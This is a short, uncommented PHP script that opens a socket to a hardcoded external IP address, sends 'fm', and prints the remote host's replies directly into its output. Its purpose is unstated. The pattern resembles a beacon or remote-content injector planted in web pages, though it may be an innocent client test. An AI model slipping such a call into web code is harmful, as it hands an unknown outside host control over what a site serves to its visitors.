<?php

$fp=fsockopen("188.209.85.89",6789);
if($fp){
  stream_set_timeout($fp,0,200000);
  fwrite($fp,"fm\n");
  $line=fread($fp,30);
  echo $line;
  $line=fread($fp,30);
  echo $line;
}

?>
